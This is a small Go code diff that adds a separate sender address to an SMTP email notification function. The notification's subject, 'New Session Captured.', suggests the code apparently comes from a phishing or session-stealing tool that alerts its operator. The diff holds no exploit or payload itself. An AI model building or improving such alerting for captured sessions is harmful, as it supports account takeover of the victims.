@@ -6,10 +6,10 @@ import (
 	"strconv"
 )
 
-func sendMailNotification(smtpHost string, smtpPort int, smtpUser, smtpPassword, to, body string) error {
+func sendMailNotification(smtpHost string, smtpPort int, smtpUser, smtpFrom, smtpPassword, to, body string) error {
 	auth := smtp.PlainAuth("", smtpUser, smtpPassword, smtpHost)
 	smtpAddress := smtpHost + ":" + strconv.Itoa(smtpPort)
-	from := fmt.Sprintf("%s", smtpUser)
+	from := fmt.Sprintf("%s", smtpFrom)
 	subject := "New Session Captured."
 	msg := "From: " + from + "\n" +
 		"To: " + to + "\n" +
